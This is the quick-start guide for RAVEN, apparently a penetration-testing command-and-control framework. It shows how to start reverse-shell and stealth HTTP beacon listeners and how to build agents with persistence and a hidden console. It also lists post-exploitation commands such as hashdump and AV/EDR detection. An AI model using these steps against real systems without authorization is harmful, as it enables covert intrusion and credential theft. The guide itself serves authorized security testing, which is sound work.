<div align="center">
    <img src="public/raven.svg" width="150px" />
</div>

# RAVEN — Quick Start Guide

Everything you need to go from a fresh build to an active C2 session.

---

## Prerequisites

Ensure the following are installed before proceeding:

| Requirement  | Minimum Version | Notes                        |
| ------------ | --------------- | ---------------------------- |
| Java JDK     | 17+             | JDK with JavaFX for GUI mode |
| Apache Maven | 3.8+            | Required for build           |
| Git          | Any             | For cloning the repository   |

---

## Step 1 — Build

```bash
cd RAVEN
mvn clean package -q
```

The compiled JAR is output to:

```
target/raven-3.0.0.jar
```

---

## Step 2 — Configure

All server settings are managed in:

```
config/server/raven.properties
```

Key fields to set before first run:

```properties
server.host=0.0.0.0
server.port=4444

web.host=0.0.0.0
web.port=5000

db.type=sqlite

logging.level=INFO
logging.file.enabled=false
```

Default operator credentials are defined in `config/operator/operator.properties`:

```properties
admin.username=admin
admin.password=admin
admin.role=SUPER
```

> **Change the default credentials before any deployment.**

---

## Step 3 — Choose an Interface Mode

RAVEN supports three interface modes. Pick one based on your engagement setup.

### Web Panel (default)

Browser-based interface at `http://localhost:5000`.

```bash
java -jar target/raven-3.0.0.jar -W
```

### CLI Mode

Full-featured terminal interface.

```bash
java -jar target/raven-3.0.0.jar -C
```

### JavaFX GUI Mode

Desktop application with sidebar navigation.

```bash
java -jar target/raven-3.0.0.jar -G
```

---

## Step 4 — Choose a Listener Mode

Select your listener protocol based on the target environment and agent type.

| Flag | Protocol            | Use Case                               |
| ---- | ------------------- | -------------------------------------- |
| `-A` | Multi (auto-detect) | Default — handles all agent types      |
| `-R` | Raw TCP             | Netcat-style reverse shells            |
| `-b` | HTTP beacon         | Covert HTTP agent communication        |
| `-B` | HTTPS beacon        | Encrypted HTTP agent communication     |
| `-T` | TCP TLS             | RAVEN agent over TLS                   |
| `-M` | Mutual TLS (mTLS)   | RAVEN agent with certificate auth      |
| `-F` | Full mTLS + HTTPS   | Maximum security — mTLS + HTTPS beacon |

---

## Step 5 — Start the Server

Combine listener mode and interface mode in a single command.

### Common Startup Examples

```bash
# Multi-protocol listener + Web Panel
java -jar target/raven-3.0.0.jar -A -W

# mTLS listener + CLI, custom bind
java -jar target/raven-3.0.0.jar -M -C -s 0.0.0.0 -p 4444

# HTTPS beacon + Web Panel, custom bind
java -jar target/raven-3.0.0.jar -B -W -s 0.0.0.0 -p 4444

# Full mTLS + HTTPS + GUI
java -jar target/raven-3.0.0.jar -F -G
```

### General Flags

| Flag        | Description                                   |
| ----------- | --------------------------------------------- |
| `-s <addr>` | C2 server bind address (overrides properties) |
| `-p <port>` | C2 listener port (overrides properties)       |
| `-h`        | Show help and exit                            |

---

## Step 6 — (mTLS Only) Initialize Certificates

Required before using `-M`, `-T`, or `-F` listener modes.

```bash
java -jar target/raven-3.0.0.jar -i -s <your-server-ip>
```

This generates the CA, server certificate, and PKCS12 keystores under `certs/`.

### Generate Agent Certificates

```bash
# Single agent cert
java -jar target/raven-3.0.0.jar -a agent01 -ah <callback-host> -ap <callback-port>

# Single agent — mTLS + persistence + hidden console
java -jar target/raven-3.0.0.jar -a agent01 -ah 192.168.1.10 -ap 4444 -am -ps -hc

# Bulk — 10 agents
java -jar target/raven-3.0.0.jar -m -c 10 -u agent -ah 192.168.1.10 -ap 4444 -am

# List all generated agent certs
java -jar target/raven-3.0.0.jar -l

# Revoke an agent cert
java -jar target/raven-3.0.0.jar -r agent01
```

---

## Step 7 — Add Operators (Optional)

Manage operator accounts before going multi-operator.

```bash
# Add operator with default role (OPERATOR)
java -jar target/raven-3.0.0.jar -AO -u operator1 -pw securepass

# Add operator with a specific role
java -jar target/raven-3.0.0.jar -AO -u operator1 -pw securepass -r ADMIN

# Remove operator
java -jar target/raven-3.0.0.jar -RO -u operator1

# Update operator role
java -jar target/raven-3.0.0.jar -OP -u operator1 -r MEMBER
```

### Operator Roles

| Role       | Permissions                      |
| ---------- | -------------------------------- |
| `SUPER`    | read, write, exec, kick `[rwxk]` |
| `ADMIN`    | read, write, exec `[rwx-]`       |
| `OPERATOR` | read, exec `[r-x-]`              |
| `MEMBER`   | read `[r---]`                    |

---

## Step 8 — TeamServer Mode (Multi-Operator)

Run a shared C2 instance with a dedicated REST API for multiple connected clients.

```bash
# TeamServer with CLI
java -jar target/raven-3.0.0.jar -TSC

# TeamServer with Web Panel on custom API port
java -jar target/raven-3.0.0.jar -TSW -tp 5001

# TeamServer with GUI
java -jar target/raven-3.0.0.jar -TSG

# Full mTLS + TeamServer Web
java -jar target/raven-3.0.0.jar -F -TSW -tp 5001
```

The TeamServer exposes its REST API on port `5001` by default (configurable via `teamserver.port` in `raven.properties`).

---

## Working with Sessions (CLI)

Once an agent connects, use these core commands to begin interaction.

```bash
sessions                          # list all active sessions
use <id>                          # enter interactive shell
sysinfo <id>                      # show full system info
exec <id> <command>               # run a command on the agent
broadcast all <command>           # run command on all agents
kill <id>                         # terminate session
```

### Inside an Interactive Session

```bash
<command>     # run any system command
back          # return to main console
clean         # clear terminal
```

---

## Quick Recon Reference

Common recon commands after entering a session.

```bash
whoami <id>           # current user
id <id>               # user ID and groups
uname <id>            # OS and kernel info
ps <id>               # running processes
netstat <id>          # network connections
ifconfig <id>         # network interfaces
privcheck <id>        # privilege check
antivirus <id>        # detect AV / EDR
hashdump <id>         # dump password hashes
```

---

## Database Backends

| Backend    | `db.type` value | Notes                          |
| ---------- | --------------- | ------------------------------ |
| In-memory  | `none`          | Default — no persistence       |
| SQLite     | `sqlite`        | File-based, no server required |
| PostgreSQL | `postgres`      | Production-grade relational DB |
| MongoDB    | `mongo`         | Document-oriented store        |

Configure in `config/server/raven.properties` under `db.*` keys.

---

## Useful Startup Recipes

| Scenario                      | Command                                                     |
| ----------------------------- | ----------------------------------------------------------- |
| Quick lab (no persistence)    | `java -jar target/raven-3.0.0.jar -A -C`                    |
| Web Panel + multi-protocol    | `java -jar target/raven-3.0.0.jar -A -W`                    |
| Stealth HTTP beacon + CLI     | `java -jar target/raven-3.0.0.jar -b -C -s 0.0.0.0 -p 80`   |
| Encrypted mTLS + CLI          | `java -jar target/raven-3.0.0.jar -M -C -s 0.0.0.0 -p 4444` |
| Full secure stack + Web Panel | `java -jar target/raven-3.0.0.jar -F -W -s 0.0.0.0 -p 443`  |
| TeamServer multi-op (CLI)     | `java -jar target/raven-3.0.0.jar -A -TSC`                  |
| TeamServer multi-op (Web)     | `java -jar target/raven-3.0.0.jar -F -TSW -tp 5001`         |

---

## Further Reading

- **Full documentation:** [https://matrixtm26.github.io/RAVEN](https://matrixtm26.github.io/RAVEN)
- **Wiki:** [https://github.com/MatrixTM26/RAVEN/wiki](https://github.com/MatrixTM26/RAVEN/wiki)
- **README:** Installation, overview, and features
- **SECURITY.md:** Vulnerability disclosure and responsible use policy
- **CONTRIBUTING.md:** Contribution guidelines

---

> **Legal Reminder:** RAVEN is an authorized penetration testing tool.
> You must have explicit written authorization for all target systems.
> Unauthorized use is a criminal offense. See `README.md` for the full legal disclaimer.

---

<p align="center">
    &copy; Copyright 2023-2026
    <a href="https://github.com/matrixtm26">@MatrixTM26</a>
    &nbsp;&middot;&nbsp;
    Licensed under
    <a href="./LICENSE">AGPL-V3</a>
</p>
